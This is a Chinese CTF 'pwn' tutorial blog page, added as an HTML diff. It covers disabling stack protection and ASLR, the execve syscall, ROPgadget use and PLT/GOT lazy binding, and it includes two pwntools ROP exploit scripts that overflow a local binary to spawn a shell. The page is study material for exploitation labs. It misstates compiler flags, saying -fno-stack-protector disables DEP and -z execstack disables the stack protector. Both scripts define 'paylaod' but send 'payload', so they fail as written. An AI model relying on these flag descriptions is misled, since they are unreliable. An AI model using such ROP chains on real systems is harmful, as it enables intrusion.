@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="题目源码编译如果希望什么保护都没有的编译命令一般是： 1gcc -m32 -fno-stack-protector -z execstack -o level1 level1.c   -m32的意思是编译为32位的程序，64位操作系统有时候需要安装兼容包 -fno-stack-protector会关闭DEP -z execstack会关闭Stack Protector  在root权限下执行，或者">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN-Tips-1">
+<meta property="og:url" content="http://yoursite.com/2020/02/14/PWN-Tips-1/index.html">
+<meta property="og:site_name" content="ZERO-A-ONE">
+<meta property="og:description" content="题目源码编译如果希望什么保护都没有的编译命令一般是： 1gcc -m32 -fno-stack-protector -z execstack -o level1 level1.c   -m32的意思是编译为32位的程序，64位操作系统有时候需要安装兼容包 -fno-stack-protector会关闭DEP -z execstack会关闭Stack Protector  在root权限下执行，或者">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/QQ%E5%9B%BE%E7%89%8720200214210409.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780401627-53526fc2-3646-4478-b040-8f1fb30ca0dc.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780428606-42b2c58b-1809-43dc-8b4e-afa79a1456cf.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780626820-92e99da4-b8f0-43c7-b9df-1ba09342a0ff.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739542097-a6d2738b-9a08-4b5f-acd8-d5f2c4d77278.jpeg">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739570228-64997692-8003-4c10-acf2-2c8d91095e3c.jpeg">
+<meta property="og:updated_time" content="2020-02-15T08:33:50.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PWN-Tips-1">
+<meta name="twitter:description" content="题目源码编译如果希望什么保护都没有的编译命令一般是： 1gcc -m32 -fno-stack-protector -z execstack -o level1 level1.c   -m32的意思是编译为32位的程序，64位操作系统有时候需要安装兼容包 -fno-stack-protector会关闭DEP -z execstack会关闭Stack Protector  在root权限下执行，或者">
+<meta name="twitter:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/QQ%E5%9B%BE%E7%89%8720200214210409.png">
+  <link rel="canonical" href="http://yoursite.com/2020/02/14/PWN-Tips-1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>PWN-Tips-1 | ZERO-A-ONE</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZERO-A-ONE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Suche..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+     <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/14/PWN-Tips-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ZERO-A-ONE">
+      <meta itemprop="description" content="Resit much,Obey little">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZERO-A-ONE">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">PWN-Tips-1
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2020-02-14 08:32:06" itemprop="dateCreated datePublished" datetime="2020-02-14T08:32:06-08:00">2020-02-14</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2020-02-15 00:33:50" itemprop="dateModified" datetime="2020-02-15T00:33:50-08:00">2020-02-15</time>
+              </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="题目源码编译"><a href="#题目源码编译" class="headerlink" title="题目源码编译"></a>题目源码编译</h2><p>如果希望什么保护都没有的编译命令一般是：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -z execstack -o level1 level1.c</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-m32</code>的意思是编译为32位的程序，64位操作系统有时候需要安装兼容包</li>
+<li><code>-fno-stack-protector</code>会关闭DEP</li>
+<li><code>-z execstack</code>会关闭Stack Protector</li>
+</ul>
+<p>在root权限下执行，或者sudo执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+
+<p>这样就关闭掉了整个系统的ASLR</p>
+<h2 id="gdb调试内存"><a href="#gdb调试内存" class="headerlink" title="gdb调试内存"></a>gdb调试内存</h2><p>gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行程序的时候，buf的位置会固定在别的地址上，这里采用的方法是开启：core dump</p>
+<p>在root权限下执行，或者sudo执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c unlimited</span><br></pre></td></tr></table></figure>
+
+<p>开启之后，当出现内存错的时候，系统会生成一个core dump文件在当前目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了，使用gdb调试转储：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb name core</span><br></pre></td></tr></table></figure>
+
+<h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>Linux的系统调用通过<code>int 80h</code>实现，用系统调用号来区分入口函数。应用程序调用系统调用的过程是：</p>
+<ul>
+<li>把系统调用的编号存入EAX</li>
+<li>把函数参数存入其它通用寄存器</li>
+<li>触发0x80号中断（int 0x80）</li>
+</ul>
+<p>那么我们如果希望通过系统调用来获取shell就需要把系统调用的参数放入各个寄存器，然后执行int 0x80就可以了</p>
+<p>如果说想通过系统调用执行的是：<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>（32位程序）</p>
+<p>那么eax寄存器应该存放系统调用号，查看execve的系统调用号：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/include/asm/unistd_32.h | grep execve</span><br></pre></td></tr></table></figure>
+
+<p>可以得到为11，转换为16进制就为0xb，所以eax中应该存放0xb</p>
+<p>ebx应该存放想要执行的”/bin/sh”的地址，还有两个参数设置为0</p>
+<p>所以现在需要做的就是让：</p>
+<ul>
+<li>eax=0xb</li>
+<li>ebx=”/bin/sh”的地址</li>
+<li>ecx=0</li>
+<li>edx=0</li>
+</ul>
+<p>只需要让栈顶的值是0xb然后可以通过pop eax达到目的，要用ROPgadget来查找，使用命令找到pop eax：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget	--binary rop --only 'pop|ret' | grep 'eax'</span><br></pre></td></tr></table></figure>
+
+<p>类似的，通过这条命令寻找控制其它寄存器的地址，找到可以控制多个的。同时使用找到字符串在什么地方</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget	--binary rop --string '/bin/sh'</span><br></pre></td></tr></table></figure>
+
+<p>以及还有需要的int 0x80</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget	--binary rop --only 'int'</span><br></pre></td></tr></table></figure>
+
+<p>类似的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./rop'</span>)</span><br><span class="line">int_addr=<span class="number">0x8049421</span></span><br><span class="line">bin_addr=<span class="number">0x80be408</span></span><br><span class="line">pop_other_ret=<span class="number">0x806eb90</span></span><br><span class="line">pop_eax_ret=<span class="number">0x80bb196</span></span><br><span class="line">paylaod=<span class="string">'a'</span>*<span class="number">112</span>+p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_other_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_addr)+p32(int_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./rop'</span>)</span><br><span class="line">pop_eax_ret=<span class="number">0x80bb196</span></span><br><span class="line">pop_other_ret=<span class="number">0x806eb90</span></span><br><span class="line">int_addr=<span class="number">0x8049421</span></span><br><span class="line">bin_addr=<span class="number">0x80be408</span></span><br><span class="line">paylaod=flat([<span class="string">'a'</span>*<span class="number">112</span>,pop_eax_ret,<span class="number">0xb</span>,pop_other_ret,<span class="number">0</span>,<span class="number">0</span>,bin_addr,int_addr])</span><br><span class="line"><span class="comment">#flat模块能将patten字符串和地址结合并且转换为字节模式</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>栈的布局就是：</p>
+<table>
+<thead>
+<tr>
+<th align="center">Low Address</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">“A”*112</td>
+</tr>
+<tr>
+<td align="center">pop_eax_ret</td>
+</tr>
+<tr>
+<td align="center">0xb</td>
+</tr>
+<tr>
+<td align="center">pop_edx_ecx_ebx_ret</td>
+</tr>
+<tr>
+<td align="center">0</td>
+</tr>
+<tr>
+<td align="center">0</td>
+</tr>
+<tr>
+<td align="center">/bin/sh</td>
+</tr>
+<tr>
+<td align="center">int 0x80</td>
+</tr>
+<tr>
+<td align="center"><strong>High Address</strong></td>
+</tr>
+</tbody></table>
+<h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><h3 id="PLT-amp-GOT"><a href="#PLT-amp-GOT" class="headerlink" title="PLT&amp;GOT"></a>PLT&amp;GOT</h3><p>以printf函数为例，运行时进行重定位是无法修改代码段的，只能将printf重定位到数据段，但是已经编译好的程序，调用printf的时候怎么才能找到这个地址呢。链接器会额外生成一小段代码，通过这段代码来获取printf()的地址，就像下面那样，进行链接的时候只需要对printf_stub()经行重定位操作就可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">;调用printf的call指令</span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line">printf_stub:</span><br><span class="line">	mov rax,[printf函数的存储地址]	;获取printf重定位之后的地址</span><br><span class="line">	jmp rax;跳过去执行printf函数</span><br><span class="line">	</span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">printf函数的存储地址，这里存储printf重定位后的地址</span><br></pre></td></tr></table></figure>
+
+<p>总体来说，动态链接每个函数需要两个东西：</p>
+<ul>
+<li>用来存放外部函数地址的数据段</li>
+<li>用来获取数据段记录的外部函数地址的代码</li>
+</ul>
+<p>对应有两个表，一个用来存放外部的函数地址的数据表称为<strong>全局偏移表</strong>（GOT，Global Offset Table），那个存放额外代码的表成为程序链接表（PLT，Procedure Link Table）</p>
+<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/QQ%E5%9B%BE%E7%89%8720200214210409.png" alt></p>
+<p>可执行文件里面保存的是PLT表的地址，对应PTL地址指向的是GOT的地址，GOT表指向的就是glibc中的地址。那我们可以发现，在这里面想要通过PLT表获取函数的地址，首先要保证GOT表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，Linux引入了延迟绑定机制</p>
+<h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>只有在动态库函数在被调用时，才会地址解析和重定位工作，为此可以用类似这样的代码来实现：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一开始没有重定位的时候将printf@got填成lookup_printf的地址</span></span><br><span class="line"><span class="keyword">void</span> <span class="built_in">printf</span>@got()</span><br><span class="line">&#123;</span><br><span class="line">    address_good:</span><br><span class="line">    	jmp *<span class="built_in">printf</span>@got</span><br><span class="line">    lookup_printf:</span><br><span class="line">    	<span class="comment">//调用重定位函数查找printf地址，并写到printf@got</span></span><br><span class="line">    	<span class="keyword">goto</span> address_good;<span class="comment">//再返回去执行address_good</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>说明一下这段代码工作流程，一开始<code>printf@got</code>是<code>lookup_printf</code>函数的地址，这个函数用来寻找<code>printf()</code>的地址，然后写入<code>printf@got</code>，<code>lookup_printf</code>执行完成后会返回到<code>address_good</code>，这样再jmp的话就可以直接跳到<code>printf</code>来执行了</p>
+<p>也就是说，如果不知道printf的地址，就去找一下，知道的话就直接去jmp执行printf了</p>
+<p>接下来，我们就来看一下这个”找”的工作是怎么实现的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">080482d0 &lt;common@plt&gt;:</span><br><span class="line"> 80482d0:	ff 35 04 a0 04 08    	pushl  0x804a004</span><br><span class="line"> 80482d6:	ff 25 08 a0 04 08    	jmp    *0x804a008</span><br><span class="line"> 80482dc:	00 00                	add    %al,(%eax)</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">080482e0 &lt;puts@plt&gt;:</span><br><span class="line"> 80482e0:	ff 25 0c a0 04 08    	jmp    *0x804a00c</span><br><span class="line"> 80482e6:	68 00 00 00 00       	push   $0x0</span><br><span class="line"> 80482eb:	e9 e0 ff ff ff       	jmp    80482d0 &lt;_init+0x28&gt;</span><br><span class="line"></span><br><span class="line">080482f0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80482f0:	ff 25 10 a0 04 08    	jmp    *0x804a010</span><br><span class="line"> 80482f6:	68 08 00 00 00       	push   $0x8</span><br><span class="line"> 80482fb:	e9 d0 ff ff ff       	jmp    80482d0 &lt;_init+0x28&gt;</span><br></pre></td></tr></table></figure>
+
+<p>ps.这里 plt 表的第一项使用 objdump 的时候给没有符号名的一项自动改成了离他最近的一项，为了避免引起误会，改成了 common，而且随着不断深入，会发现，确实可以叫 common</p>
+<p>其中除第一个表项以外，plt 表的第一条都是跳转到对应的 got 表项，而 got 表项的内容我们可以通过 gdb 来看一下，如果函数还没有执行的时候，这里的地址是对应 plt 表项的下一条命令，即 push 0x0</p>
+<p>还记得之前我们说的，在还没有执行过函数之前<code>printf@got</code>的内容是<code>lookup_printf</code>函数的地址，这就是要去找<code>printf</code>函数的地址了</p>
+<p>现在要做的是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push   $0x0    ;将数据压到栈上，作为将要执行的函数的参数</span><br><span class="line">jmp    0x80482d0   ;去到了第一个表项</span><br></pre></td></tr></table></figure>
+
+<p>接下来继续</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">080482d0 &lt;common@plt&gt;:</span><br><span class="line">pushl  0x804a004  ;将数据压到栈上，作为后面函数的参数</span><br><span class="line">jmp    *0x804a008 ;跳转到函数</span><br><span class="line">add    %al,(%eax)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+
+<p>我们同样可以使用 gdb 来看一下这里面到底是什么，可以看到，在没有执行之前是全 0</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780401627-53526fc2-3646-4478-b040-8f1fb30ca0dc.png" alt="image.png"></p>
+<p>当执行后他有了值</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780428606-42b2c58b-1809-43dc-8b4e-afa79a1456cf.png" alt="image.png"></p>
+<p>这个值对应的函数是 <code>_dl_runtime_resolve</code></p>
+<p>那现在做一个小总结：</p>
+<p>在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve</span><br></pre></td></tr></table></figure>
+
+<p>到这里我们还需要知道</p>
+<ol>
+<li><code>_dl_runtime_resolve</code> 是怎么知道要查找 printf 函数的</li>
+<li><code>_dl_runtime_resolve</code> 找到 printf 函数地址之后，它怎么知道回填到哪个 GOT 表项</li>
+</ol>
+<p>第一个问题，在 xxx@plt 中，我们在 jmp 之前 push 了一个参数，每个 xxx@plt 的 push 的操作数都不一样，那个参数就相当于函数的<strong>id</strong>，告诉了<code>_dl_runtime_resolve</code>要去找哪一个函数的地址</p>
+<p>在 elf 文件中 .rel.plt 保存了重定位表的信息，使用 <code>readelf -r test</code> 命令可以查看 test 可执行文件中的重定位信息</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780626820-92e99da4-b8f0-43c7-b9df-1ba09342a0ff.png" alt="image.png"></p>
+<p>这里有些问题，对应着大佬博客说 plt 中 push 的操作数，就是对应函数在.rel.plt 段的偏移量，但是没对比出来</p>
+<p>第二个问题，看 .rel.plt 的位置就对应着 xxx@plt 里 jmp 的地址</p>
+<blockquote>
+<p>在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：</p>
+<p><strong>got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址</strong> </p>
+<p><strong>got [1]：本 ELF 的 link_map 数据结构描述符地址</strong> </p>
+<p><strong>got [2]：_dl_runtime_resolve 函数的地址</strong></p>
+<p>动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项</p>
+</blockquote>
+<p><strong>跟着大佬的流程图来走一遍：</strong></p>
+<p>第一次调用</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739542097-a6d2738b-9a08-4b5f-acd8-d5f2c4d77278.jpeg" alt="img"></p>
+<p>之后再次调用<img src="https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739570228-64997692-8003-4c10-acf2-2c8d91095e3c.jpeg" alt="img"></p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/02/12/Win10-64bit╧┬80x86╗π▒α╗╖╛│╦┘│╔/" rel="next" title="Win10-64bit下80x86汇编环境速成">
+                  <i class="fa fa-chevron-left"></i> Win10-64bit下80x86汇编环境速成
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/02/16/pwn╚δ├┼ú¿Basic-ROPú⌐/" rel="prev" title="pwn入门（Basic-ROP）">
+                  pwn入门（Basic-ROP） <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目源码编译"><span class="nav-number">1.</span> <span class="nav-text">题目源码编译</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gdb调试内存"><span class="nav-number">2.</span> <span class="nav-text">gdb调试内存</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#系统调用"><span class="nav-number">3.</span> <span class="nav-text">系统调用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#动态链接"><span class="nav-number">4.</span> <span class="nav-text">动态链接</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PLT-amp-GOT"><span class="nav-number">4.1.</span> <span class="nav-text">PLT&amp;GOT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#延迟绑定"><span class="nav-number">4.2.</span> <span class="nav-text">延迟绑定</span></a></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
+  <div class="site-description" itemprop="description">Resit much,Obey little</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">Kategorien</span>
+        
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
